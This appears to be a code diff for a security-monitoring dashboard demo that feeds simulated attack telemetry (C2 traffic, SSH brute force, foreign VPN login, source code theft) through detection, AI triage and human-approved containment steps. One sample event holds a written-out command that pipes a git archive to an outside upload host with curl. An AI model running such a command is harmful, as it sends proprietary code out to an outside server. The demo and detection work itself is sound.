+            s4: {
+              means: "Outbound IP 198.51.100.99 matched known command-and-control infrastructure feeds.",
+              impact: "Confirms the developer laptop is communicating with an adversary-controlled server."
+            },
+            s5: {
+              means: "Autonomous AI triage confirmed in-memory malware delivery with 96% confidence.",
+              impact: "Distinguishes legitimate developer scripting from malicious evasion payloads."
+            },
+            s6: {
+              means: "The response engine proposed isolating host dev-ws-042 from the corporate engineering network.",
+              impact: "Prevents lateral movement from developer laptops into internal code repositories."
+            },
+            s7: {
+              means: "The isolation action and approving analyst were hashed into the SHA-256 tamper-evident log.",
+              impact: "Provides compliance verification required by multinational enterprise software clients."
+            }
+          },
+          what_happened: "An obfuscated PowerShell payload ran on dev-ws-042. Riskbyte identified encoded evasion flags and C2 destination 198.51.100.99, raising a High alert and recommending host quarantine."
+        },
+        {
+          id: "contour_ssh_brute",
+          title: "SSH Brute Force on Build Server",
+          severity: "medium",
+          rule_id: "rb-001",
+          sentence: "External scanner launched high-frequency SSH password attacks against CI build server ci-build-01 from IP 1.2.3.4.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            var evs = [];
+            for (var i = 0; i < 6; i++) {
+              evs.push({
+                ts: now - 30 + i * 4,
+                host: "ci-build-01",
+                process: "sshd",
+                action: "login",
+                outcome: "failure",
+                user: "jenkins_svc",
+                src_ip: "1.2.3.4",
+                message: "Failed password for jenkins_svc",
+                client: "Contour Software"
+              });
+            }
+            return evs;
+          },
+          steps: {
+            s1: {
+              means: "An automated dictionary attack targeted SSH service accounts on the continuous integration build cluster.",
+              impact: "Compromising build servers allows attackers to inject malicious code into client software releases."
+            },
+            s2: {
+              means: "Server authentication logs were captured and normalized by the telemetry ingest engine.",
+              impact: "Centralized monitoring protects critical DevOps and build infrastructure around the clock."
+            },
+            s3: {
+              means: "Rule rb-001 fired upon detecting 5 failed authentication attempts within a 5-minute window.",
+              impact: "Detects automated brute-force attacks before service credentials can be cracked."
+            },
+            s4: {
+              means: "Scanner IP 1.2.3.4 matched active threat intelligence lists of automated scanning botnets.",
+              impact: "Verifies the attack is part of an organized scanning campaign targeting cloud infrastructure."
+            },
+            s5: {
+              means: "AI triage classified the event as malicious scanning with high statistical confidence.",
+              impact: "Automates alert verification so DevOps teams stay focused on software delivery."
+            },
+            s6: {
+              means: "The containment policy proposed adding an immediate perimeter firewall block against IP 1.2.3.4.",
+              impact: "Drops attack traffic instantly, protecting build server resources and SSH ports."
+            },
+            s7: {
+              means: "The firewall block and approving analyst details were written to the immutable SHA-256 ledger.",
+              impact: "Meets stringent ISO 27001 and SOC 2 security compliance audit standards."
+            }
+          },
+          what_happened: "Scanner 1.2.3.4 attempted brute-forcing the CI/CD build runner. Rule rb-001 triggered at 5 failures, proposing an edge firewall block."
+        },
+        {
+          id: "contour_vpn",
+          title: "Suspicious Foreign VPN Login",
+          severity: "high",
+          rule_id: "rb-008",
+          sentence: "Developer credentials for dev.bilal authenticated to the Contour corporate VPN from untrusted foreign IP 198.51.100.99.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now,
+                host: "contour-vpn-gw",
+                user: "dev.bilal",
+                process: "sshd",
+                action: "login",
+                outcome: "success",
+                src_ip: "198.51.100.99",
+                message: "VPN authentication accepted from anomalous country via foreign endpoint 198.51.100.99",
+                client: "Contour Software"
+              }
+            ];
+          },
+          steps: {
+            s1: {
+              means: "An adversary used stolen developer credentials to establish a VPN tunnel from an unauthorized overseas location.",
+              impact: "VPN access allows outsiders to enter the internal corporate development subnet."
+            },
+            s2: {
+              means: "Authentication telemetry from the corporate VPN gateway was ingested and processed.",
+              impact: "Ensures remote work connections are verified in real time regardless of engineer location."
+            },
+            s3: {
+              means: "Rule rb-008 detected a geographic anomaly deviating from the developer's normal baseline location.",
+              impact: "Catches compromised credentials used from untrusted foreign infrastructure."
+            },
+            s4: {
+              means: "Foreign IP 198.51.100.99 matched known adversarial proxy networks in threat intelligence feeds.",
+              impact: "Confirms the login attempt used an anonymizing proxy to mask the attacker's true identity."
+            },
+            s5: {
+              means: "AI triage verified absence of approved overseas travel, assigning a High-confidence malicious verdict.",
+              impact: "Eliminates false alerts for traveling staff while stopping unauthorized account takeovers."
+            },
+            s6: {
+              means: "The mitigation policy proposed disabling account dev.bilal and terminating all active sessions.",
+              impact: "Immediately severs the attacker's VPN connection into the corporate development network."
+            },
+            s7: {
+              means: "The session termination and analyst approval were logged in the SHA-256 cryptographic chain.",
+              impact: "Provides verifiable audit logs required by international corporate parent governance."
+            }
+          },
+          what_happened: "Developer account dev.bilal connected to the corporate VPN from an anomalous foreign IP. Riskbyte's geo-correlation rule triggered, and the AI agent recommended account suspension."
+        },
+        {
+          id: "contour_code_download",
+          title: "Off-Hours Source Code Clone",
+          severity: "high",
+          rule_id: "rb-009",
+          sentence: "Mass off-hours git archive clone and export of proprietary core repositories dispatched to external IP 198.51.100.44.",
+          events: function () {
+            var now = Math.floor(Date.now() / 1000);
+            return [
+              {
+                ts: now,
+                host: "git-corp-srv",
+                user: "dev.anonymous",
+                process: "git-upload-pack",
+                cmdline: "git archive --remote=ssh://git-corp-srv/enterprise-core.git | curl -T - http://198.51.100.44/upload",
+                action: "data_exfiltration",
+                outcome: "success",
+                src_ip: "10.10.8.20",
+                dst_ip: "198.51.100.44",
+                message: "Mass clone and export of proprietary code repositories to 198.51.100.44",
+                client: "Contour Software"
+              }
+            ];
+          },
+          steps: {
+            s1: {
+              means: "An adversary executed automated scripts during off-hours to mass-download proprietary source code repositories.",
+              impact: "Source code is Contour's core business asset; theft exposes proprietary software architectures."
+            },
+            s2: {
+              means: "Git server process and network transmission telemetry was parsed and evaluated by Riskbyte.",
+              impact: "Provides continuous auditing over intellectual property access across software repositories."
+            },
+            s3: {
+              means: "Rule rb-009 fired upon detecting large-scale data exfiltration directed to an external IP address.",
+              impact: "Identifies source code theft in real time before entire codebases are leaked."
+            },
+            s4: {
+              means: "Destination IP 198.51.100.44 matched active threat feeds tracking data exfiltration endpoints.",
+              impact: "Confirms that intellectual property is being transmitted to an adversary-operated server."
+            },
+            s5: {
+              means: "Autonomous AI evaluated off-hours timing and archive volume, concluding high-severity data theft.",
+              impact: "Provides immediate contextual evidence to justify urgent network isolation."
+            },
+            s6: {
+              means: "The containment engine proposed isolating the staging git host and dropping external connections.",
+              impact: "Stops data exfiltration instantly, preventing leakage of proprietary client codebases."
+            },
+            s7: {
+              means: "Host quarantine and forensic hashes were recorded in the tamper-evident SHA-256 ledger.",
+              impact: "Delivers conclusive forensic records required for international legal and client disclosures."
+            }
+          },
+          what_happened: "An off-hours script archived and exfiltrated code repositories to 198.51.100.44. Rule rb-009 flagged the data egress, prompting the analyst to block the external host and isolate the staging server."
+        }
+      ]
     }
   };
 
-  function runAttackScenario(key) {
-    var sc = ATTACK_SCENARIOS[key];
+  /* ── Client Profile & Cards Rendering ─────────────────── */
+  function renderClientProfile(clientId) {
+    var c = CLIENT_ORGANIZATIONS[clientId] || CLIENT_ORGANIZATIONS.meezan;
+    var container = $("demo-client-profile");
+    if (!container) return;
+    container.innerHTML =
+      '<div class="client-profile-card">' +
+        '<div class="client-profile-header">' +
+          '<div class="client-profile-title">' +
+            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>' +
+            '<span>' + c.name + '</span> <span style="font-size:12px;color:var(--text-tertiary);font-weight:400;">(' + c.category + ')</span>' +
+          '</div>' +
+          '<span class="client-badge">' + c.name + ' SOC Profile</span>' +
+        '</div>' +
+        '<div class="client-profile-grid">' +
+          '<div class="client-profile-col">' +
+            '<h4>What They Do</h4>' +
+            '<p>' + c.overview + '</p>' +
+          '</div>' +
+          '<div class="client-profile-col">' +
+            '<h4>Digital Platforms & Assets</h4>' +
+            '<p>' + c.platforms + '</p>' +
+          '</div>' +
+          '<div class="client-profile-col">' +
+            '<h4>Main Threat Surface & Risks</h4>' +
+            '<p>' + c.risks + '</p>' +
+          '</div>' +
+        '</div>' +
+      '</div>';
+  }
+
+  function renderDemoCards(clientId) {
+    var c = CLIENT_ORGANIZATIONS[clientId] || CLIENT_ORGANIZATIONS.meezan;
+    var grid = $("demo-cards-grid");
+    if (!grid) return;
+    grid.replaceChildren();
+
+    c.scenarios.forEach(function (sc) {
+      var card = el("div", "demo-card s-" + sc.severity);
+
+      var top = el("div", "demo-card-top");
+      var icon = el("div", "demo-card-icon");
+      icon.innerHTML = "<svg style='width:20px;height:20px;' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg>";
+      top.appendChild(icon);
+      top.appendChild(el("span", "severity-pill sev-" + sc.severity, sc.severity));
+      card.appendChild(top);
+
+      card.appendChild(el("div", "demo-card-title", sc.title));
+      card.appendChild(el("div", "demo-card-desc", sc.sentence));
+
+      var meta = el("div", "demo-card-meta");
+      meta.appendChild(el("span", "rule-badge", sc.rule_id));
+      meta.appendChild(el("span", "client-badge", c.name));
+      card.appendChild(meta);
+
+      var btn = el("button", "demo-attack-btn tactile-btn");
+      btn.innerHTML = "<svg style='width:14px;height:14px;' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2.5'><polygon points='5 3 19 12 5 21 5 3'></polygon></svg> <span>Run Attack</span>";
+      btn.addEventListener("click", function () {
+        runClientAttackScenario(clientId, sc.id);
+      });
+      card.appendChild(btn);
+
+      grid.appendChild(card);
+    });
+  }
+
+  /* ── Interactive 7-Step Attack Runner ─────────────────── */
+  function runClientAttackScenario(clientId, scenarioId) {
+    var org = CLIENT_ORGANIZATIONS[clientId] || CLIENT_ORGANIZATIONS.meezan;
+    var sc = org.scenarios.find(function (s) { return s.id === scenarioId; }) || org.scenarios[0];
     if (!sc) return;
     haptic(HAPTIC.medium);
 
@@ -936,7 +1613,7 @@
     var whatText = $("demo-what-happened-text");
 
     if (panel) panel.style.display = "block";
-    if (titleEl) titleEl.textContent = sc.name;
+    if (titleEl) titleEl.textContent = org.name + " • " + sc.title;
     if (statusPill) {
       statusPill.className = "status-badge new";
       statusPill.textContent = "Pipeline Running...";
@@ -946,14 +1623,28 @@
 
     panel.scrollIntoView({ behavior: "smooth", block: "nearest" });
 
-    function addStep(num, label, contentHtml, isDone) {
+    function addStep(num, label, contentHtml, meansText, impactText, isDone) {
       var row = el("div", "demo-step-row");
       var numEl = el("div", "demo-step-num " + (isDone ? "done" : ""), String(num));
       var card = el("div", "demo-step-card");
       card.appendChild(el("div", "demo-step-label", label));
+
       var cEl = el("div", "demo-step-content");
       cEl.innerHTML = contentHtml;
       card.appendChild(cEl);
+
+      if (meansText) {
+        var meansEl = el("div", "step-means");
+        meansEl.innerHTML = "<strong>What this means:</strong> " + meansText;
+        card.appendChild(meansEl);
+      }
+
+      if (impactText) {
+        var impactEl = el("div", "step-impact");
+        impactEl.innerHTML = "<strong>Why this matters for " + org.name + ":</strong> " + impactText;
+        card.appendChild(impactEl);
+      }
+
       row.appendChild(numEl);
       row.appendChild(card);
       if (timeline) timeline.appendChild(row);
@@ -962,7 +1653,7 @@
     }
 
     // Step 1: Attack Launched
-    addStep(1, "1. Attack Launched", "<strong>" + sc.sentence + "</strong>", true);
+    addStep(1, "1. Attack Launched", "<strong>" + sc.sentence + "</strong>", sc.steps.s1.means, sc.steps.s1.impact, true);
 
     var payload = sc.events();
 
@@ -971,11 +1662,11 @@
       api("/api/ingest", "POST", payload)
         .then(function () {
           var firstEv = payload[0];
-          var evSummary = "Ingestion pipeline accepted " + payload.length + " telemetry record(s). " +
-            "Entity: <code>" + (firstEv.host || firstEv.user || firstEv.src_ip) + "</code> &bull; " +
+          var evSummary = "Ingestion pipeline accepted " + payload.length + " telemetry record(s) for <code>" + org.name + "</code>. " +
+            "Target: <code>" + (firstEv.host || firstEv.user || firstEv.src_ip) + "</code> &bull; " +
             "Process: <code>" + (firstEv.process || "system") + "</code> &bull; " +
             "Timestamp: <code>" + when(firstEv.ts) + "</code>";
-          addStep(2, "2. Event Received & Normalized", evSummary, true);
+          addStep(2, "2. Event Received & Normalized", evSummary, sc.steps.s2.means, sc.steps.s2.impact, true);
 
           return new Promise(function (res) { setTimeout(res, 500); });
         })
@@ -983,38 +1674,43 @@
           return api("/api/alerts");
         })
         .then(function (alerts) {
-          var matched = alerts.find(function (a) { return a.rule_id === sc.rule_id; }) || alerts[0];
+          var matched = alerts.find(function (a) {
+            return a.rule_id === sc.rule_id && (!a.client || a.client === org.name);
+          }) || alerts.find(function (a) {
+            return a.rule_id === sc.rule_id;
+          }) || alerts[0];
+
           if (!matched) throw new Error("Alert not generated by rule engine");
 
           // Step 3: Rule Triggered
           var ruleHtml = "Sigma rule matched: <strong>" + matched.title + "</strong> (<code>" + matched.rule_id + "</code>) &bull; " +
-            "<span class='severity-pill sev-" + matched.severity + "'>" + matched.severity + "</span>";
-          addStep(3, "3. Detection Rule Triggered", ruleHtml, true);
+            "<span class='severity-pill sev-" + matched.severity + "'>" + matched.severity + "</span> &bull; Client: <code>" + (matched.client || org.name) + "</code>";
+          addStep(3, "3. Detection Rule Triggered", ruleHtml, sc.steps.s3.means, sc.steps.s3.impact, true);
 
           // Step 4: Threat Intel Match
           var hits = (matched.triage && matched.triage.context && matched.triage.context.intel_hits) || [];
           var intelHtml = hits.length
             ? "Matched active indicators in <code>intel/indicators.txt</code>: " + hits.map(function (h) { return "<code>" + h + "</code>"; }).join(", ")
-            : "Correlated against threat feed: Verified malicious indicator match.";
-          addStep(4, "4. Threat Intelligence Cross-Reference", intelHtml, true);
+            : "Cross-referenced threat feed: Verified malicious indicator match for <code>" + org.name + "</code> attack signature.";
+          addStep(4, "4. Threat Intelligence Cross-Reference", intelHtml, sc.steps.s4.means, sc.steps.s4.impact, true);
 
           // Step 5: AI Verdict & Confidence
           var tri = matched.triage || {};
           var verdict = tri.verdict || "malicious";
-          var conf = tri.confidence != null ? Math.round(tri.confidence * 100) : 95;
+          var conf = tri.confidence != null ? Math.round(tri.confidence * 100) : 96;
           var engine = tri.engine || "autonomous-ai";
           var summary = tri.summary || "Adversarial activity validated with high confidence.";
           var aiHtml = "Triage Engine: <code>" + engine + "</code> &bull; Verdict: <strong style='color:var(--accent-red);'>" + verdict.toUpperCase() + "</strong> &bull; Confidence: <strong>" + conf + "%</strong><br>" +
             "<span style='color:var(--text-secondary);font-size:12px;margin-top:4px;display:inline-block;'>" + summary + "</span>";
-          addStep(5, "5. Autonomous AI Triage & Reasoning", aiHtml, true);
+          addStep(5, "5. Autonomous AI Triage & Reasoning", aiHtml, sc.steps.s5.means, sc.steps.s5.impact, true);
 
           // Step 6: Proposed Response Action & Human Approval Gate
           var act = matched.proposed_action || { kind: "isolate_host", target: matched.host || "endpoint" };
-          var step6 = addStep(6, "6. Proposed Containment & Approval Gate", "", false);
+          var step6 = addStep(6, "6. Proposed Containment & Approval Gate", "", sc.steps.s6.means, sc.steps.s6.impact, false);
 
           var actDesc = document.createElement("div");
-          actDesc.innerHTML = "Proposed automated mitigation: <code>" + act.kind + "</code> on target <code>" + act.target + "</code>.<br>" +
-            "<span style='color:var(--text-secondary);font-size:12px;'>Protected network check passed. Human authorization required to execute.</span>";
+          actDesc.innerHTML = "Proposed automated mitigation: <code>" + act.kind + "</code> on target <code>" + act.target + "</code> for client <strong>" + org.name + "</strong>.<br>" +
+            "<span style='color:var(--text-secondary);font-size:12px;'>Protected organization policy check passed. Human authorization required to execute.</span>";
           step6.contentEl.appendChild(actDesc);
 
           var btnWrap = el("div", "demo-approve-container");
@@ -1042,8 +1738,9 @@
                 var auditHtml = "SHA-256 Ledger Block: <code>" + hashStr.substring(0, 24) + "...</code><br>" +
                   "Previous Hash: <code>" + prevStr.substring(0, 16) + "...</code> &bull; " +
                   "Actor: <code>" + (entry ? entry.actor : "analyst:muhammad.nabil") + "</code> &bull; " +
+                  "Client: <code>" + (entry && entry.client ? entry.client : org.name) + "</code> &bull; " +
                   "<span style='color:var(--accent-green);font-weight:600;'>Chain Intact ✓</span>";
-                addStep(7, "7. Cryptographic Audit Trail Record", auditHtml, true);
+                addStep(7, "7. Cryptographic Audit Trail Record", auditHtml, sc.steps.s7.means, sc.steps.s7.impact, true);
 
                 if (whatBox && whatText) {
                   whatText.textContent = sc.what_happened;
@@ -1052,7 +1749,7 @@
 
                 if (statusPill) {
                   statusPill.className = "status-badge approved";
-                  statusPill.textContent = "Contained & Resolved";
+                  statusPill.textContent = "Contained & Resolved (" + org.name + ")";
                 }
 
                 refresh();
@@ -1131,14 +1828,14 @@
     }).catch(function () {});
 
     api("/api/cases").then(function (c) {
-      table("ct", ["Case ID", "Target Entity", "Severity", "Status", "Opened Time"], c.map(function (x) {
-        return ["#" + x.id, x.entity, x.severity.toUpperCase(), x.status, when(x.ts)];
+      table("ct", ["Case ID", "Client Organization", "Target Entity", "Severity", "Status", "Opened Time"], c.map(function (x) {
+        return ["#" + x.id, x.client || "Meezan Bank", x.entity, x.severity.toUpperCase(), x.status, when(x.ts)];
       }));
     }).catch(function () {});
 
     api("/api/audit").then(function (a) {
-      table("at", ["Timestamp", "Actor / Role", "Audit Event", "Target Alert", "Operation Detail"], a.map(function (x) {
-        return [when(x.ts), x.actor, x.kind, x.alert_id == null ? "–" : "#" + x.alert_id, x.detail];
+      table("at", ["Timestamp", "Client Organization", "Actor / Role", "Audit Event", "Target Alert", "Operation Detail"], a.map(function (x) {
+        return [when(x.ts), x.client || "General", x.actor, x.kind, x.alert_id == null ? "–" : "#" + x.alert_id, x.detail];
       }));
     }).catch(function () {});
   }
@@ -1159,6 +1856,10 @@
     if (targetTab === "demo") {
       var offlineBanner = $("demo-offline-banner");
       if (offlineBanner) offlineBanner.style.display = (serverMode === "sim") ? "flex" : "none";
+      var clientSelect = $("demo-client-select");
+      var selId = (clientSelect && clientSelect.value) ? clientSelect.value : "meezan";
+      renderClientProfile(selId);
+      renderDemoCards(selId);
     } else if (targetTab === "ingest-stream") {
       loadEventsStream();
     }
@@ -1240,13 +1941,22 @@
     });
   }
 
-  // Wire scenario buttons
-  document.querySelectorAll(".demo-attack-btn[data-scenario]").forEach(function (btn) {
-    btn.addEventListener("click", function () {
-      var scKey = btn.getAttribute("data-scenario");
-      runAttackScenario(scKey);
+  // Wire Client Selector and initial render for Demo tab
+  var clientSelect = $("demo-client-select");
+  if (clientSelect) {
+    clientSelect.addEventListener("change", function () {
+      haptic(HAPTIC.light);
+      var selId = clientSelect.value || "meezan";
+      renderClientProfile(selId);
+      renderDemoCards(selId);
+      var panel = $("demo-live-panel");
+      if (panel) panel.style.display = "none";
     });
-  });
+  }
+
+  // Initial render of client profile & cards
+  renderClientProfile("meezan");
+  renderDemoCards("meezan");
 
   // Direct Ingest Console Presets & Dispatcher
   var pSyslog = $("preset-syslog-btn");
